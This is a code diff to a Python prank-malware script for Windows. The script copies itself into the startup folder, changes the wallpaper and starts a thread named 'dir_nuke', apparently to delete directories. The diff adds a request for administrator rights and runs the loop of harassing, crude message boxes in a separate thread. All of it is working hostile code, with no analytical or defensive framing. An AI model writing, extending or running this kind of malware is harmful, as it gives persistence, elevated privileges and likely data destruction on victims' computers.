@@ -19,8 +19,18 @@ def copy_to_startup():
     script_path = sys.argv[0]
     shutil.copy(script_path, startup_folder)
 
-def display_error_messages():
-    while True:
+def check_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def ask_for_admin():
+    if not check_admin():
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+
+def display_error_messages(condition):
+    while condition.is_set():
         ctypes.windll.user32.MessageBoxW(0, "Congratulations, you have won an STD!", "LMAO", 0x10 | 0x1)
         ctypes.windll.user32.MessageBoxW(0, "Aw come on, dont go.", "LMAO", 0x10 | 0x1)
         ctypes.windll.user32.MessageBoxW(0, "Give up.", "LMAO", 0x10 | 0x1)
@@ -62,14 +72,24 @@ def change_wallpaper():
     os.remove(wallpaper_file)
 
 if __name__ == "__main__":
+    ask_for_admin()
+
     copy_to_startup()
     change_wallpaper()
 
     dir_nuke_thread = threading.Thread(target=dir_nuke)
     dir_nuke_thread.start()
 
+    condition = threading.Event()
+    condition.set()
+
+    error_thread = threading.Thread(target=display_error_messages, args=(condition,))
+    error_thread.start()
+
     time.sleep(5)
     move_image_boxes_thread = threading.Thread(target=move_image_boxes)
     move_image_boxes_thread.start()
 
-    display_error_messages()
+    move_image_boxes_thread.join()
+    condition.clear()
+    error_thread.join()
